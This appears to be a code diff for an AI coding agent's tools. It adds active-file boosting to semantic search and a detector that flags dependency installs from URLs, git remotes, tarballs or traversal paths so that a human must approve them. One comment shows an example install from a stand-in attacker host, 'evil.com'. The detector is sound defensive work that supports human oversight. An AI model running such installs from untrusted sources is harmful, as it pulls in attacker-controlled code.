@@ -402,7 +402,8 @@ const semanticSearchTool: AgentTool = {
   schema: z.object({ query: z.string().min(2).max(1000), limit: z.coerce.number().int().min(1).max(20).optional() }),
   async execute(context, raw) {
     const args = raw as { query: string; limit?: number };
-    const results = await context.indexer.search(context.projectId, args.query, args.limit ?? 8);
+    // Pass any open context files so active-file boosting applies to on-demand searches too.
+    const results = await context.indexer.search(context.projectId, args.query, args.limit ?? 8, context.reads ? [...context.reads.keys()].map((key) => key.split(':')[0] ?? '').filter(Boolean) : []);
     if (results.length === 0) {
       return 'No semantic index results. The project may not be indexed yet; use search_code or read_file.';
     }
@@ -651,6 +652,26 @@ const runTestsTool: AgentTool = {
   },
 };
 
+/**
+ * Returns true if the install command appears to pull a package from a non-registry
+ * source (URL, local path with traversal, `file:` protocol, or a known suspicious
+ * pattern). These are flagged `dangerous` so the permission broker always requires
+ * an explicit human decision regardless of the approval policy.
+ */
+function isDangerousInstall(command: string): boolean {
+  const patterns = [
+    /https?:\/\//i,           // npm install http://evil.com/pkg
+    /file:\.\./i,             // file:../../something
+    /\bgit\+https?:/i,        // git+https://
+    /\bgit\+ssh:/i,           // git+ssh://
+    /\bssh:/i,
+    /(^|\s)\.\.[\\/]/,        // relative path traversal
+    /\btar\b.*\.tgz/i,        // tarball installs
+    /@[^/]+\/[^@\s]+@https?:\/\//i, // scoped pkg with URL version
+  ];
+  return patterns.some((pattern) => pattern.test(command));
+}
+
 const installDepsTool: AgentTool = {
   name: 'install_dependencies',
   description: 'Install project dependencies using the detected package manager. Requires approval.',
@@ -669,12 +690,14 @@ const installDepsTool: AgentTool = {
       command = install?.command ?? 'npm install';
     }
     const cwd = await context.workspace.resolveSafe('', false);
+    const dangerous = isDangerousInstall(command);
     const response = await context.permissions.require({
       kind: 'install',
-      title: 'Install dependencies',
+      title: dangerous ? 'Install from non-registry source (potentially unsafe)' : 'Install dependencies',
       detail: args.reason ?? 'The agent needs additional packages.',
       command,
       cwd,
+      dangerous,
       toolName: 'install_dependencies',
       runId: context.runId,
     });
